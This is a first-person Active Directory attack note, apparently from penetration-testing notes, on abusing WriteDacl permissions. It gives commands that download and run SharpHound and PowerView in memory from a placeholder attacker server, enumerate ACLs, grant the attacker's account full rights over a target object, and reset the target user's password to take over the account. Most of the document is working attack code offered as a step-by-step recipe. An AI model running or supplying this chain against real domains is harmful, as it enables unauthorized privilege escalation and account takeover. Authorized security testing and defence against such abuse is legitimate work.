# <h1 align="center" id="heading">WriteDacl</h1>
There are a few ways that I can check for WriteDacl privileges within an Active Directory environment. The first and easiest is through BloodHound. I can collect BloodHound graphing information for the target domain in a few ways. The easiest and most accurate way is through SharpHound collection. I prefer to run the collection in memory with the following command:
```powershell
IEX(new-Object System.Net.WebClient).DownloadString("http://<attacker_server>/SharpHound.ps1");Invoke-BloodHound -CollectionMethod All
```
If I have valid domain credentials, I can use the Python collector BloodHound.py. This can be run from any platform that has Python support so I do not need to rely solely on Windows. This comes in handy when I find myself on a Domain-joined linux system. I can use the following command to execute the BloodHound graphing information collection:
```console
bloodhound-python -u <username> -p '<password>' -ns <target ip> -d <domain name> -c all
```
This may or may not work depending on the target system! I can also use the following PowerView command to enumerate the presence of WriteDacl much faster:
```powershell
IEX(new-Object System.Net.WebClient).DownloadString("http://<attacker_server>/PowerView.ps1");Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
```
Once I discover the presence of WriteDacl over an object I can go about exploiting this misconfiguration by granting my current domain user All rights over it with the following command:
```powershell
Add-DomainObjectAcl -TargetIdentity <target user> -PrincipalIdentity <current user> -Rights All
```
After I grant All rights to my target I can check to see if those changes were applied by running the following command:
```powershell
Get-ObjectAcl -Identity testservice2 -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
```
I can now finish the exploit by changing the user's password with the following command:
```powershell
net user <target user> Password123! /domain
```
After chaning the user's password, I will be able to establish a session as that user in any way it is allowed to authenticate!
